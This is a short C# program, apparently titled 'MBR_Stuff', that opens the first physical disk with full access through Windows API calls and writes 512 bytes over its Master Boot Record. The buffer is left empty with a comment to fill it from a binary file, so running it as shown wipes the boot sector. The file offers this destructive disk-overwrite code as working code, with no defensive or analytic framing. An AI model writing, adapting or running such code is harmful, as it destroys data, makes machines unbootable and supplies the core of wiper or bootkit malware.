using System;
using System.Runtime.InteropServices;

namespace MBR_Stuff
{
    class Program
    {
        private static readonly IntPtr z = IntPtr.Zero;
        [DllImport("kernel32")]
        private static extern IntPtr CreateFile(string lpFileName,uint dwDesiredAccess,uint dwShareMode,IntPtr lpSecurityAttributes,uint dwCreationDisposition,uint dwFlagsAndAttributes,IntPtr hTemplateFile);

        [DllImport("kernel32")]
        private static extern bool WriteFile(IntPtr hFile,byte[] lpBuffer,uint nNumberOfBytesToWrite,out uint lpNumberOfBytesWritten,IntPtr lpOverlapped);
        static void Main(string[] args)
        {
            byte[] newData = new byte[512];
            //write bin file to newData

            IntPtr mbrPointer = CreateFile("\\\\.\\PhysicalDrive0", 0x10000000, 0x1 | (uint)0x2, z, 0x3, 0,z);
            if (mbrPointer == (IntPtr)(-0x1))
            {
                Console.WriteLine("Run with admin privileges");
                Environment.Exit(0);
            }
            if (WriteFile(mbrPointer,newData,512,out uint lpNumberOfBytesWritten,z))
            {
                Console.WriteLine("Success, wrote {0} bytes to Master Boot Record",lpNumberOfBytesWritten.ToString());
            }
            else
            {
                Console.WriteLine("Fail");
            }
        }
    }
}
